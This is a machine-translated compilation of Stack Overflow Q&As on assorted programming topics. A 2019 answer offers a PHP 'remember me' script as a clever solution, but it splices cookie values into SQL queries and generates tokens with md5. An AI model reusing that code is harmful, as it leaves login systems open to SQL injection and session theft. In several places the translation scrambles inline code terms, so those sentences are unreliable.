如果我删除数据库中这张表的数据，问题就会消失，但我将无法删除客户机器上的记录。不管设计是否糟糕，我必须以某种方式在 EF 级别解决这个问题。

我有什么选择来重做这个？如果我的 Child 对象没有返回父级的导航属性，而是有两个 int Fks，我想知道是否会有导致序列化阻塞的循环？有没有办法在一个实体上将导航属性更改为 Fks？

谢谢！

**更新：**

将子项的两个导航属性都移回父项可以解决此问题。我认为这不一定是周期问题，但也许堆栈已经用尽了试图检查引用并确定周期。

我不一定要删除导航属性。它们对客户端很有用。有没有更好的方法来解决这个问题？自定义序列化？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-07-09T21:44:12.977

当我使用 WCF 测试 EF 的性能时，我遇到了一个类似的问题。当查询的结果集超过 3000 个结果时，我得到了 StackOverflow。

如果您**只消除其中一个**导航属性，StackOverflow 就会消失。我将尝试解释循环发生的位置，但你们也可以尝试使用 DataContractSeriazer 将图形序列化到文件中，当您看到生成的 XML 时，您就会意识到出了什么问题。

每个对象只被序列化一次，但是序列化是深度优先的。以您的场景为例：

1 - 序列化 parent1

2 - 序列化 ChildList1 的第一个元素

3 - 现在我们正在序列化与 parent1 有关系的对象 Child1（已经序列化，因此使用了 Ref）。所以序列化 ParentUsed（一个不同的对象，parent2，与其他孩子有更多的关系） - 为 parent2 执行第 1 步

如果加载的父列表和关系的复杂性（记录之间）足够大，序列化器将尝试将所有图形序列化为第一个元素的“子”（递归）。**将其中一个**导航属性移回父级将消除循环，剩余的导航属性将始终引用已序列化的父级。

如果您只使用导航属性绑定到 UI，则可以使用多个 BindingSource（我习惯于 WinForms）和 FK 来建立关系并获得与导航属性相同的结果（尽管涉及更多工作）。

希望这可以帮助，

努诺佩雷拉

# c# - 在 ASP.NET 中从 XML 加载图像

> ID：11091593
> 
> 赞同：0
> 
> 时间：2012-06-18T21:49:16.003
> 
> 标签：c#, asp.net, xml, xml-parsing

我有这个 XML 文件，比如说（Sample.xml）

```
<?xml version="1.0" encoding="utf-8" ?>

<drinks>
  <drink>
    <type>Coke </type>
    <image>some.jpg or (url) </image>
    <price> $5 </price>
  </drink>
  <drink>
    <type>Pepsi</type>
    <image>some.jpg or (url) </image>
    <price> $2 </price>
  </drink>
  </drinks> 
```

我也有一个列表框，它绑定到 XML 文件。

```
<asp:ListBox ID="ListBox1" runat="server" AutoPostBack="True" 
        DataSourceID="XmlDataSource2" DataTextField="drinks/drink/type" Height="198px" Width="181px">
    </asp:ListBox>
    <asp:XmlDataSource ID="XmlDataSource2" runat="server" DataFile="~/XMLFile.xml">
    </asp:XmlDataSource> 
```

我怎样才能做到这一点？好吧，为了清楚地解释我的问题，我想这样做，**产品和图像的链接应该从 xml 文件加载（图像应该是来自网络的 url）**

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-19T02:21:26.737

有很多方法可以做到这一点，但你不能列出/显示和`type`控制。您应该必须使用 GridView/DataList/Repeater 来绑定 XMLDatasource，您可以在其中显示数据和图像。`image``ListBox`

假设`<image>`标签包含图像的相对 url。

```
<?xml version="1.0" encoding="utf-8" ?>
<drinks>
  <drink>
    <type>Coke </type>
    <image>~/Images/image1.png</image>
    <price> $5 </price>
  </drink>
  ....
</drinks> 
```

并且 ASP.NET 标记将是：

```
<asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" 
    DataSourceID="XmlDataSource1">
    <Columns>
        <asp:TemplateField>
            <ItemTemplate>
                <asp:Label ID="Label1" 
                           runat="server" 
                           Text='<%# XPath("type") %>'></asp:Label>
                <asp:Image ID="Image1"
                           runat="server" Height="43px" 
                           ImageUrl='<%# XPath("image") %>' 
                           Width="35px" />
            </ItemTemplate>
        </asp:TemplateField>
    </Columns>
</asp:GridView>

<asp:XmlDataSource ID="XmlDataSource1" runat="server" DataFile="~/XMLFile.xml" 
    XPath="drinks/drink"></asp:XmlDataSource> 
```

您还可以选择`Linq-XML`解析 XML 文档并准备匿名或键入的`List<T>`.

```
XDocument doc = XDocument.Load(MapPath("~/XMLFile.xml"));
 var result = from ele in doc.Descendants("drink")
               select new
                 {
                   Type=ele.Element("type").Value,
                   Image=ele.Element("image").Value
                 };

 GridView1.DataSource = result.ToList();
 GridView1.DataBind(); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-12-31T07:34:26.693

```
 <asp:GridView ID="GridView1" runat="server" AutoGenerateColumns="False" 
DataSourceID="XmlDataSource1">
<Columns>
    <asp:TemplateField>
        <ItemTemplate>
           <asp:Label ID="Label1" runat="server" Text='<%Eval("name")%>'>
                   </asp:Label>                                          
       <asp:Image ID="Image1" runat="server" Height="43px" ImageUrl='<%# Eval("image" )%>' Width="35px" />       
        </ItemTemplate>
    </asp:TemplateField>
</Columns> 
```

# php - SQL/PHP 顺序 ID 号

> ID：11091596
> 
> 赞同：0
> 
> 时间：2012-06-18T21:49:25.953
> 
> 标签：php, mysql

是否有某种类型的 SQL 字段充当序列号，每次添加一行时增加 1。

如果不是，我们如何使用 PHP mySQL 查询找到最大列数，然后将其增加 1。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:51:18.463

你想要一个[`AUTO_INCREMENT`](http://dev.mysql.com/doc/refman/5.0/en/example-auto-increment.html)领域。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-18T21:51:10.397

是的，[http://dev.mysql.com/doc/refman/5.6/en/example-auto-increment.html](http://dev.mysql.com/doc/refman/5.6/en/example-auto-increment.html)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-18T21:52:32.127

`AUTO_INCREMENT`您可以通过启用该标志使 MySQL 数据库中的字段每新行增加 1 。对于表中的标识符，这是一种非常常见（也是非常好的）的做法。

# php - 我的 php“记住我”系统安全/实用吗？

> ID：11091601
> 
> 赞同：2
> 
> 时间：2012-06-18T21:49:51.707
> 
> 标签：php, security, cookies

我目前正在为一个网络项目实施“记住我”系统。在阅读了一些（尽管不是那么有用的文章）之后，我想出了这个系统来防止 cookie 被用于访问分配给的用户以外的帐户：

1.  用户登录并选中“记住我”框。
2.  用户电子邮件和密码组合已通过身份验证。因为要检查记住我功能，所以会创建一个长度为 128 个字符的随机盐并将其与用户用户 ID 一起存储在一个表中。设置一个 cookie，其中包含用户 userid 的散列连接到用户 userid 和 salt 的散列。
3.  当用户重新访问该网页时，用户 ID 和哈希是分开的，并且哈希是根据存储在数据库中的盐和用户 ID 生成的哈希来检查的。如果值匹配，则用户是分配 cookie 的用户并且用户已登录。

如果有任何问题/可以改进，请指出我总是乐于批评:)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-18T21:57:28.467

您的系统有一个良好的开端，但仍然很容易受到劫持（如果有人获取了存储在 cookie 中的哈希，他可以轻松接管会话）。

无论如何，这里有一些关于这个主题的好帖子：

*   [PHP：记住我和安全性？](https://stackoverflow.com/questions/4743574/php-remember-me-and-security)
*   [安全 Cookie？](https://stackoverflow.com/questions/4011449/secure-cookies)
*   [使用 Cookie 记住我时的安全性](https://stackoverflow.com/questions/6484630/security-when-using-cookies-to-remember-me/6484757#6484757)
*   [使用登录 cookie 的相对安全的方法是什么？](https://stackoverflow.com/questions/4773609/what-is-a-relatively-secure-way-of-using-a-login-cookie)

我认为您应该从阅读这些链接开始。

确实没有一个完整的万无一失的系统（查看第 3 和第 4 个链接，它们提供了一些有趣的额外内容；用户代理是您也可以使用的某种标识符）。我可以建议您使用某种 OpenID 提供程序（或多个）来摆脱所有安全问题。如果确实想自己做：您必须权衡利弊以实现最大的安全性或更少。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-18T22:16:52.110

就像其他人说的那样，你有一个好的开始。我建议创建一个存储一些 cookie 信息的表，特别是：

```
user_id
random_hash
ip_address
date_created 
```

然后，当用户登录时，您会像您所说的那样生成一个哈希，并将该数据插入到表中并创建存储他们的 user_id 和哈希的 cookie。

当用户返回时，您检查哈希和 ip_address 并查找匹配项。如果找到一个，则验证所述 user_id**并**删除使用的散列并为下次登录生成一个新散列。我相信你可以看到这样做的好处。

另外 - 确保您使用 SSL 并且（**重要**）绝不允许用户在不提供密码的情况下更改或查看任何关键信息！

干杯!

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-18T21:55:25.970

不，这太复杂了。

1.  在包含列的数据库中创建`remember_me`（或您喜欢的任何表名）表`user_id | hash`

2.  使用“记住我”选项对用户进行身份验证后，生成**随机**哈希并将其与对应的 user_id 和用户的 cookie 一起放入表中

3.  当用户来到一个页面并且没有经过身份验证并且具有“remember_me”cookie - 通过 cookie 值查找 user_id

重要的是：没有正当理由将您的 remember_me 客户端数据依赖于真实用户名、电子邮件、密码或任何东西

PS：如果您愿意，可以将客户端数据附加到 user_id 值

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-18T21:53:45.590

是的，这听起来不错，但为什么要重新发明轮子呢？您正在描述会话。您也可以使用 PHP 内置的功能。

[http://php.net/manual/en/features.sessions.php](http://php.net/manual/en/features.sessions.php)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2019-09-28T14:46:28.483

我想我找到了一个聪明的解决方案！

这个（复杂的？）脚本的优点：

*   当用户在选中记住我的情况下成功登录时，除了标准会话管理 cookie 之外，还会发出一个登录 cookie。[2]

*   登录 cookie 包含用户的用户名、系列标识符和令牌。系列和令牌是来自适当大空间的不可猜测的随机数。这三者一起存储在数据库表中。

*   当未登录用户访问该站点并显示登录 cookie 时，将在数据库中查找用户名、系列和令牌。

*   如果存在三元组，则认为用户已通过身份验证。使用的令牌将从数据库中删除。生成一个新令牌，并使用用户名和相同的系列标识符存储在数据库中，并向用户发出一个包含所有三个的新登录 cookie。

*   如果存在用户名和系列但令牌不匹配，则假定为盗窃。用户会收到措辞强硬的警告，并且用户记住的所有会话都将被删除。

*   如果用户名和系列不存在，则忽略登录 cookie。

我在数据库中创建了一个包含以下信息的表：

```
session | token | username | expire 
```

记住我的 cookie 将具有以下设置：

```
$value = "$session|$token|$userhash"; //Total length = 106 
```

*   `Session`将是一个 40 (sha1) 个字符的字符串。
*   `Token`将是一个 32 (md5) 个字符的字符串。
*   `Userhash`在 cookie 中将是 32 个（用户名的 md5）字符的字符串。
*   `Username`在数据库中将是正常的用户名。
*   `Expire`现在将是 + 60 天。

剧本：

```
ini_set('session.hash_function', 'sha1');
ini_set('session.hash_bits_per_character', '4');

session_start();

if(isset($_POST['user']) && isset($_POST['password'])) {
    if(isset($_COOKIE['remember']) && strlen($_COOKIE['remember']) == 106) {
      //THERE is a cookie, which is the right length 40session+32token+32user+2'|'
      //Now lets go check it...
      //How do I protect this script form harmful user input?
      $plode = explode('|', $_COOKIE['remember']);
      $session = htmlspecialchars($plode[0]);
      $token = htmlspecialchars($plode[1]);
      $userhash = htmlspecialchars($plode[2]);
      $result_query = $auth->query("SELECT user
                  FROM sessions
                  WHERE session = '$session'
                  AND token = '$token'
                  AND user = '$userhash'");
      $result_array = array();

      $auth_query = $auth->query("SELECT user FROM sessions WHERE session = '$session' AND user = '$userhash'");
      $auth_array = array();

      while ($result_object = $result_query->fetch(PDO::FETCH_NUM)) {
          $result_array[] = $result_object;
      }

      while ($auth_object = $auth_query->fetch(PDO::FETCH_NUM)) {
          $auth_array[] = $auth_object;
      }

      if(count($result_array) > 0){
        if(isset($_COOKIE['PHPSESSID'])) {
          //COOKIE is completely valid!
          //Make a new cookie with the same session and another token.
          $newusername = $auth_array[0][0];
          $newsession = $session;
          $newtoken = md5(uniqid(rand(), true));
          $newuserhash = $newusername;
          $value = "$newsession|$newtoken|$newuserhash";
          $expire = time() + 4184000;
          setcookie('remember', $value, $expire, '/', 'spigotpool.ml', isset($_SERVER["HTTPS"]), true);
          $auth_query = $auth->prepare("UPDATE sessions
                  SET token = :newtoken, expire=:expire
                  WHERE session = :session
                  AND token = :token
                  AND user = :userhash");
          $auth_query->bindParam(':newtoken', $newtoken);
          $auth_query->bindParam(':expire', $expire);
          $auth_query->bindParam(':session', $session);
          $auth_query->bindParam(':token', $token);
          $auth_query->bindParam(':userhash', $userhash);
          $auth_query->execute();
          //Set-up the whole session (with user details from database) etc...
        }
      } else if(count($auth_array) == 1) {
          //TOKEN is different, session is valid
          //This user is probably under attack
          //Put up a warning, and let the user re-validate (login)
          //Remove the whole session (also the other sessions from this user?)
      } else {
          //Cookie expired in database? Unlikely...
          //Invalid in what way?
          //Make a new cookie with the same session and another token.
          $newusername = $_POST['user'];
          $newsession = session_id();
          $newtoken = md5(uniqid(rand(), true));
          $newuserhash = md5($newusername);
          $value = "$newsession|$newtoken|$newuserhash";
          $expire = time() + 4184000;
          setcookie('remember', $value, $expire, '/', 'www.example.com', isset($_SERVER["HTTPS"]), true);
          $auth->query("INSERT INTO sessions (token, expire, session, user) VALUES ('$newtoken', '$expire', '$newsession', '$newuserhash')");
          header('Location: index.php?action=logged-in');
      }
    } else {
      //No cookie, rest of the script
      //Make a new cookie with the same session and another token.
      $newusername = $_POST['user'];
      $newsession = session_id();
      $newtoken = md5(uniqid(rand(), true));
      $newuserhash = md5($newusername);
      $value = "$newsession|$newtoken|$newuserhash";
      $expire = time() + 4184000;
      setcookie('remember', $value, $expire, '/', 'www.example.com', isset($_SERVER["HTTPS"]), true);
      $auth->query("INSERT INTO sessions (token, expire, session, user) VALUES ('$newtoken', '$expire', '$newsession', '$newuserhash')");
      header('Location: index.php?action=logged-in');
    }
} 
```

脚本的优点：

*   多次登录。您可以为您所在的每台计算机创建新会话。
*   Cookie 和数据库将保持清洁。活跃用户每次登录都会更新 cookie。
*   一开始的会话检查确保数据库不会收到无用的请求。
*   如果攻击者窃取了 cookie，它会获得一个新的令牌，但不会获得一个新的会话。因此，当真正的用户使用旧的（无效的）令牌但使用有效的用户会话组合访问网站时，用户会收到潜在盗窃的警告。通过登录重新验证后，会创建一个新会话，并且攻击者持有的会话无效。重新验证确保受害者确实是受害者，而不是攻击者。

参考：http: [//jaspan.com/improved_persistent_login_cookie_best_practice](http://jaspan.com/improved_persistent_login_cookie_best_practice)

# sublimetext2 - SublimeText 2 web.config xml格式

> ID：11091606
> 
> 赞同：11
> 
> 时间：2012-06-18T21:50:03.667
> 
> 标签：sublimetext2

我已将 90% 的开发 IDE 工作转移到 SublimeText。我用得越多，我就越喜欢它的简单。

我无法弄清楚如何为不同的文件扩展名设置代码格式/着色。如何让 subllimeText 知道 .config 文件是 xml 文件？

* * *

## 回答 #1

> 赞同：31
> 
> 时间：2012-06-18T22:13:48.263

您可以使用以下方法进行设置：

1.  打开你的 .config 文件
2.  查看 -> 语法 -> 以当前扩展名打开所有... -> XML

# python - 使用装饰器设置类的元类

> ID：11091609
> 
> 赞同：6
> 
> 时间：2012-06-18T21:50:33.630
> 
> 标签：python, decorator, metaclass

按照[这个答案](https://stackoverflow.com/a/5121381/623518)，似乎可以在使用以下*定义类后更改类的元类：

```
class MyMetaClass(type):
    # Metaclass magic...

class A(object):
    pass

A = MyMetaClass(A.__name__, A.__bases__, dict(A.__dict__)) 
```

定义一个函数

```
def metaclass_wrapper(cls):
    return MyMetaClass(cls.__name__, cls.__bases__, dict(cls.__dict__)) 
```

允许我像这样将装饰器应用于类定义，

```
@metaclass_wrapper
class B(object):
    pass 
```

似乎元类魔法适用于`B`，但`B`没有`__metaclass__`属性。上述方法是否是将元类应用于类定义的明智方法，即使我正在定义和重新定义一个类，或者我最好简单地编写

```
class B(object):
    __metaclass__ = MyMetaClass
    pass 
```

我认为这两种方法之间存在一些差异。

* * *

*注意，链接问题中的原始答案`MyMetaClass(A.__name__, A.__bases__, A.__dict__)`，返回一个`TypeError`：

> TypeError: type() 参数 3 必须是 dict，而不是 dict_proxy

似乎（类定义）的`__dict__`属性具有类型，而*实例*的属性的类型具有类型。为什么是这样？这是 Python 2.x 与 3.x 的区别吗？`A``dict_proxy``__dict__`*`A``dict`*

 ** * *

## 回答 #1

> 赞同：6
> 
> 时间：2014-07-25T13:33:55.340

诚然，我参加聚会有点晚了。但是，我认为这是值得添加的。

这是完全可行的。话虽如此，还有很多其他方法可以实现相同的目标。但是，装饰解决方案尤其允许延迟评估 ( `obj = dec(obj)`)，而`__metaclass__`在类内部使用则不允许。在典型的装饰风格中，我的解决方案如下。

如果您只是在不更改字典或复制其属性的情况下构建类，您可能会遇到一件棘手的事情。该类之前（装饰之前）具有的任何属性似乎都将丢失。所以，复制这些然后调整它们是绝对必要的，就像我在我的解决方案中所做的那样。

就个人而言，我喜欢能够跟踪对象是如何被包裹的。所以，我添加了`__wrapped__`属性，这不是绝对必要的。它也使它更像`functools.wraps`Python 3 中的类。但是，它对内省很有帮助。此外，`__metaclass__`添加它以更像正常的元类用例。

```
def metaclass(meta):
    def metaclass_wrapper(cls):
        __name = str(cls.__name__)
        __bases = tuple(cls.__bases__)
        __dict = dict(cls.__dict__)

        for each_slot in __dict.get("__slots__", tuple()):
            __dict.pop(each_slot, None)

        __dict["__metaclass__"] = meta

        __dict["__wrapped__"] = cls

        return(meta(__name, __bases, __dict))
    return(metaclass_wrapper) 
```

对于一个简单的例子，请看以下内容。

```
class MetaStaticVariablePassed(type):
    def __new__(meta, name, bases, dct):
        dct["passed"] = True

        return(super(MetaStaticVariablePassed, meta).__new__(meta, name, bases, dct))

@metaclass(MetaStaticVariablePassed)
class Test(object):
    pass 
```

这产生了很好的结果......

```
|1> Test.passed
|.> True 
```

以不太常见但相同的方式使用装饰器...

```
class Test(object):
    pass

Test = metaclass_wrapper(Test) 
```

...正如预期的那样，产生了同样好的结果。

```
|1> Test.passed
|.> True 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-18T21:53:22.090

我对您的问题的总结：“我尝试了一种新的棘手方法来做一件事，但效果不佳。我应该改用简单的方法吗？”

是的，你应该用简单的方法来做。你还没有说为什么你有兴趣发明一种新的方法来做到这一点。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-19T02:53:08.640

该类没有`__metaclass__`设置属性...因为您从未设置它！

使用哪个元类通常**由**`__metaclass__`类块中设置的名称确定。该`__metaclass__`属性不是由元类设置的。因此，如果您直接调用元类而不是设置`__metaclass__`并让 Python 找出它，则不会`__metaclass__`设置任何属性。

事实上，普通类都是元类的实例`type`，所以如果元类总是`__metaclass__`在它的实例上设置属性，那么*每个*类都会有一个`__metaclass__`属性（大多数都设置为`type`）。

* * *

我不会使用您的装饰器方法。它掩盖了一个事实，即涉及元类（以及哪个），仍然是样板代码的一行，并且从 3 个定义特征创建一个类`(name, bases, attributes)`只是为了将这 3 个位从结果类中拉出，抛出类离开，并从相同的 3 位创建一个新的类！

在 Python 2.x 中执行此操作时：

```
class A(object):
    __metaclass__ = MyMeta
    def __init__(self):
        pass 
```

如果你写这个，你会得到大致相同的结果：

```
attrs = {}
attrs['__metaclass__'] = MyMeta
def __init__(self):
    pass
attrs['__init__'] = __init__
A = attrs.get('__metaclass__', type)('A', (object,), attrs) 
```

实际上计算元类更复杂，因为实际上必须搜索所有基础以确定是否存在元类冲突，并且如果其中一个基础没有`type`作为其元类并且`attrs`不包含`__metaclass__`则默认metaclass 是祖先的元类，而不是`type`. 这是我希望您的装饰器“解决方案”与直接使用不同的一种情况`__metaclass__`。我不确定如果在使用`__metaclass__`会给你一个元类冲突错误的情况下使用你的装饰器会发生什么，但我不希望它是令人愉快的。

此外，如果涉及任何其他元类，您的方法将导致它们首先运行（可能会修改名称、基数和属性！）然后将它们从类中拉出并使用它来创建一个新类。这可能与您使用`__metaclass__`的 .

至于`__dict__`不给你一个真正的字典，那只是一个实现细节；我猜是出于性能原因。我怀疑是否有任何规范说`__dict__`（非类）实例的类型必须与类的类型相同`__dict__`（顺便说一句，这也是一个实例；只是元类的一个实例）。类的`__dict__`属性是“dictproxy”，它允许您查找属性键，就好像它是 a`dict`但仍然不是`dict`. `type`对其第三个参数的类型很挑剔；它想要一个真正的字典，而不仅仅是一个“类似字典”的对象（为破坏鸭子打字而感到羞耻）。这不是 2.x 与 3.x 的事情；Python 3 的行为方式相同，尽管它为您提供了更好的字符串表示`dictproxy`. Python 2.4（这是我现成的最古老的 2.x）也有`dictproxy`用于类对象的`__dict__`对象。*

# wpf - 拉伸图像未完全显示

> ID：11091614
> 
> 赞同：1
> 
> 时间：2012-06-18T21:50:44.710
> 
> 标签：wpf, image, scrollviewer, stretch

我想使用 Window 在网格行中显示一个（或可选的两个）图像。这个图像可能很大，所以我将 Stretch 属性设置为“UniformToFill”并将网格嵌入到滚动查看器中。

我的图像是应用程序。800 x 400 像素，如果我尝试将其加载到我的窗口中，它不会以完整宽度显示（水平滚动条在图像结束之前停止）。

我希望图像填充可用的窗口区域，但能够滚动以完全查看它。怎么了？

谢谢你的帮助！

塔比纳

这是我的代码：

.xaml：

```
<Window x:Class="Wpf.Dialogs.ImageBox"
    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
    Title="ImageBox" Topmost="True" WindowStartupLocation="CenterOwner"  Width="800" Height="600">
<ScrollViewer VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Auto" CanContentScroll="True">
  <Grid x:Name="gridImages">
    <Grid.RowDefinitions>
      <RowDefinition Height="*" />
      <RowDefinition Height="*"/>
    </Grid.RowDefinitions>
    <Image Grid.Row="0" x:Name="img1" Stretch="UniformToFill"/>
    <Image Grid.Row="1" x:Name="img2" Stretch="UniformToFill"/>
  </Grid>
</ScrollViewer>
</Window> 
```

后面的代码：

```
using System;
using System.IO;
using System.Windows;
using System.Windows.Media.Imaging;

namespace Wpf.Dialogs
{

public partial class ImageBox : Window
{
  public ImageBox() : this("Image", string.Empty, 800, 600)
  {
  }

  public ImageBox(string title, string image, int width, int height)
    : this(title, new string[] { image }, width, height)
  {
  }

  public ImageBox(string title, string[] images, int width, int height)
  {
    InitializeComponent();

    this.Title = title;
    this.Image = images;
  }

  public string[] Image
  {
    set
    {
      if (value != null)
      {
        var bim = CreateBitmap(value[0]);
        this.img1.Source = bim;

        if (value.Length == 2)
        {
          var bi = CreateBitmap(value[1]);

          if (bi != null)
          {
            this.img2.Source = bi;
          }
        }
        else
        {
          this.img2.Source = null;
        }
      }
    }
  }

  private BitmapImage CreateBitmap(string file)
  {
    if (File.Exists(file))
    {
      var bmp = new BitmapImage();
      bmp.BeginInit();
      bmp.UriSource = new Uri(file);
      bmp.CacheOption = BitmapCacheOption.OnLoad;
      bmp.EndInit();

      return bmp;
    }
    else
    {
      return null;
    }
  }
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-19T00:13:28.653

您不能同时使用 ScrollViewer 和 Stretch="UniformToFill"。使用 Grid 和 Stretch="UniformToFill" 或 ScrollViewer 和 Grid。

# scala - 如何使用 Play Framework 2.0 创建全局变量

> ID：11091615
> 
> 赞同：13
> 
> 时间：2012-06-18T21:51:03.447
> 
> 标签：scala, playframework, playframework-2.0

如何使用 Scala 在 Play Framework 2.0 中创建全局对象/变量？

我想创建一个对象，一旦实例化，就可以在多个控制器操作之间持续存在，以便不同的操作仍然可以调用同一个对象（因为初始化对象非常昂贵）。

如果不将其存储到数据库中，这可能吗？我尝试将对象粘贴到 onStart 方法的 Global 对象中，如下所示：

[http://www.playframework.org/documentation/2.0/ScalaGlobal](http://www.playframework.org/documentation/2.0/ScalaGlobal)

这是我的代码：

（在根应用程序文件夹中）

```
object Global extends GlobalSettings {

  override def onStart(app:Application) {
    var foo = new Foo
    }
  }

} 
```

在我的控制器操作中，我尝试只按名称调用变量，但它不起作用。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-06-19T07:10:56.347

如果您的全局变量也需要可用于 中的方法`Global`，请将它们放在 Global.scala 中，如下所示：

```
package object globals {
  lazy val abc = Play.maybeApplication.flatMap(_.configuration.getString("abc")).getOrElse("default_value_of_abc")
  lazy val someActor = Akka.system.actorOf(Props[SomeActor], name = "someActor")
} 
```

然后在你的控制器中使用它，如下所示：

```
println(globals.abc)
globals.someActor ! SomeMessage 
```

**更新**

此后，文档已更新如何添加`Global.scala`惯用的 Play！方式，带有[Scala](http://www.playframework.com/documentation/2.2.x/ScalaGlobal)和[Java](http://www.playframework.com/documentation/2.2.x/JavaGlobal)的文档。

# sql-server-2005 - 合并复制 - 发布者缺少订阅者的数据

> ID：11091619
> 
> 赞同：1
> 
> 时间：2012-06-18T21:51:30.617
> 
> 标签：sql-server-2005, merge-replication

我有一个使用 SQL 2005 合并复制的数据库，并且已经将数据插入到订阅者中，而这些数据从未传递给发布者。我相信在 14 天的保留期内发生了冲突，我不再看到它了。我可以手动将它们添加到发布者中吗？任何想法或将我引导到一个好的链接表示赞赏。谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-18T22:04:28.883

如果冲突发生在当前保留期之前，我认为没有任何魔法可以将其恢复。您可以删除订阅并重新创建它（同时手动同步增量）吗？可能是最安全的行动。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-19T15:05:56.600

在我回答这个问题之前，请注意以下方向可能非常危险，必须非常小心。这个解决方案对我有用，因为有问题的表只写给一（1）个订阅者，没有其他地方。基本上我所做的是：

1.  暂停复制（我实际上禁用了我正在处理的订阅者的复制作业并在完成后启用它）
2.  将表的标识插入设置为 ON（在表上使用自动标识）
3.  将表更改为**NOCHECK** CONSTRAINT repl_identity_range_（此处为一些十六进制值）
4.  禁用了表的 MSmerge_ins_(some Hex Value here) 触发器。（确保在完成时启用此功能）！！！
5.  插入了行
6.  将 Indentity_Insert 设置为关闭
7.  启用 MSmerge_ins_(some Hex Value here) 触发器
8.  更改表以**检查**约束 repl_identity_range_（此处为一些十六进制值）

您可以通过运行 sp_help 找到 repl_identity_range 约束的名称。我建议您在完成后使用 Red Gates 数据比较等工具进行验证，以确保完成。根据您的情况，您可能还必须在所有订阅者处手动插入数据。仅供参考-我必须在不中断最终用户的情况下在生产数据库上执行此操作。请谨慎使用。

# java - 如何在 JPanel 中创建垂直 TitledBorder (javax swing)

> ID：11091620
> 
> 赞同：2
> 
> 时间：2012-06-18T21:51:41.697
> 
> 标签：java, swing, jpanel, titled-border

我试图弄清楚如何`TitledBorder`在`JPanel`.

我有这种情况：

[![图片](../Images/7669c21632546e6fe5da6443ae01a694.png)](https://i.stack.imgur.com/6FxnJ.png)

我想垂直放置“Actuators st ...”，以便用户可以阅读它。

有没有办法做到这一点，或者我应该实现自己定制的`JPanel`& `TitledBorder`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-18T22:56:56.183

*   也许是疯狂的想法，但也有可能`JSeparator`:-)

*   需要适当的`LayoutManager`，也许`GridBagLayout`（`JComponent`放置没有`GBC`可以`PreferrredSize`取自`JComponent`，但不可调整大小），不是`GridLayout`

![在此处输入图像描述](../Images/90607a44d668c090404b6b5ccada9a08.png)

```
import java.awt.BorderLayout;
import java.awt.Dimension;
import java.awt.GridLayout;
import javax.swing.BorderFactory;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JSeparator;
import javax.swing.SwingUtilities;

public class NestedLayout {

    private JFrame frame = new JFrame();
    private JPanel leftPanel = new JPanel();
    private JSeparator sep = new JSeparator();
    private JLabel label = new JLabel("<html> L<br>a<br>b<br>e<br>l<br></html>");

    public NestedLayout() {
        label.setOpaque(true);
        sep.setOrientation(JSeparator.VERTICAL);
        sep.setLayout(new GridLayout(3, 1));
        sep.add(new JLabel());
        sep.add(label);
        sep.add(new JLabel());
        leftPanel.setLayout(new BorderLayout());
        leftPanel.setBorder(BorderFactory.createEmptyBorder(
                10, //top
                10, //left
                10, //bottom
                10));  //right
        leftPanel.add(sep, BorderLayout.CENTER);
        leftPanel.setPreferredSize(new Dimension(40, 220));
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.add(leftPanel, BorderLayout.WEST);
        //frame.add(label);
        frame.pack();
        frame.setVisible(true);
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {

            @Override
            public void run() {
                NestedLayout nestedLayout = new NestedLayout();
            }
        });
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-18T22:40:02.907

如[*如何使用边框*](http://docs.oracle.com/javase/tutorial/uiswing/components/border.html)中所示，您可以使用空边框和带标题的边框创建复合边框。

附录：作为替代方案，您可以使用边框的`getMinimumSize()`方法来确保标题可见。另请参阅此相关[问答](https://stackoverflow.com/q/7229226/230513)。

![在此处输入图像描述](../Images/5b71f20f3ebe98e49c0ed5085247ca59.png)

```
f.add(createPanel("Actuator status"), BorderLayout.WEST);
f.add(createPanel("Indicator result"), BorderLayout.EAST);
...
private Box createPanel(String s) {
    Box box = new Box(BoxLayout.Y_AXIS);
    TitledBorder title = BorderFactory.createTitledBorder(null, s,
        TitledBorder.CENTER, TitledBorder.DEFAULT_POSITION);
    box.setBorder(title);
    for (int i = 0; i < 6; i++) {
        JButton b = new JButton(null, UIManager.getIcon("html.pendingImage"));
        b.setAlignmentX(JButton.CENTER_ALIGNMENT);
        box.add(b);
    }
    box.validate();
    Dimension db = box.getPreferredSize();
    int max = Math.max(title.getMinimumSize(box).width, db.width);
    box.setPreferredSize(new Dimension(max, db.height));
    return box;
} 
```

# python - 如何离线安装包？

> ID：11091623
> 
> 赞同：237
> 
> 时间：2012-06-18T21:51:46.140
> 
> 标签：python, pip, freebsd, easy-install, python-requests

从 pypi 下载 python 包及其依赖项以在另一台机器上离线安装的最佳方法是什么？使用 pip 或 easy_install 有什么简单的方法吗？我正在尝试在未连接到 Internet 的 FreeBSD 机器上安装请求库。

* * *

## 回答 #1

> 赞同：395
> 
> 时间：2013-01-21T20:55:53.190

### 在可以访问互联网的系统上

pip`download`命令允许您下载包而不安装它们：

`pip download -r requirements.txt`

